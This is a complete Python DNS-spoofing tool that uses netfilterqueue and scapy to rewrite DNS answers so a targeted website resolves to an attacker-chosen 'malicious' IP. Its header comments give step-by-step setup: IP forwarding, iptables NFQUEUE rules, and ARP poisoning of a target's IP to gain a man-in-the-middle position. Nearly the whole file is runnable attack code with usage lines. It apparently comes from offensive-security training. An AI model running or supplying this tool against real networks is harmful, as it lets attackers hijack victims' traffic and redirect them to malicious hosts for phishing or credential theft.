#!/usr/bin/env python
# Description: This program changes the DNS response of a website by suplanting the real domain name's IP with another/malicious IP (redirection_ip).
#
# sudo pip install netfilterqueue               --> Install netfilterqueue
# echo 1 > /proc/sys/net/ipv4/ip_forward        --> Ip portforwarding 
# iptables -I FORWARD -j NFQUEUE --queue-num 0  --> For mitm. Trap all the packets that usually goes to the forward chain if it is are in the netfilter queue with queue number 0.
# iptables -I OUTPUT -j NFQUEUE --queue-num 0   --> Use this and the next command instead if we are testing it in our own computer.
# iptables -I INPUT -j NFQUEUE --queue-num 0    
# python arp_spoof.py -t <target's ip> -s <ip_to_spoof>     --> Arp poisoning for mitm.
# (iptables --flush                             --> back to normal)
# ping -c 1 <website_to_spoof>                               --> to easy generate a dns request
#
# Usage:  python dns_spoof.py -r <redirection_ip> -w <website_to_spoof>
# Usage: python3 dns_spoof.py -r <redirection_ip> -w <website_to_spoof>

import argparse
import netfilterqueue
import scapy.all as scapy
import os



def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-r", "--redirection_ip", dest="redirection_ip", help="Redirection IP.")
    parser.add_argument("-w", "--website", dest="website", help="Website.")
    options = parser.parse_args()
    if not options.redirection_ip:
        parser.error("[-] Please specify a redirection ip, use --help for more info.")
    elif not options.website:
        parser.error("[-] Please specify a website, use --help for more info.")
    return options


def delete_info(scapy_packet):
    # Deleting these so scapy recalculate them
    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum
    del scapy_packet[scapy.UDP].len
    del scapy_packet[scapy.UDP].chksum


def process_packet(packet):
    # Converting packet to a scapy packet
    scapy_packet = scapy.IP(packet.get_payload())
    # Checks if DNS Response
    if scapy_packet.haslayer(scapy.DNSRR):      
        qname = scapy_packet[scapy.DNSQR].qname     # URL            
        # if website.encode() in qname:             python3
        if website in qname:
            print("[+] Spoofing target...")
            answer = scapy.DNSRR(rrname=qname, rdata=redirection_ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            delete_info(scapy_packet)
            # Converting scapy packet to a packet
            packet.set_payload(str(scapy_packet))
            # packet.set_payload(bytes(scapy_packet))   python3
    packet.accept()


def main():
    global redirection_ip
    global website
    options = get_arguments()
    redirection_ip = options.redirection_ip
    website = options.website

    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()


if __name__ == "__main__":
    main()
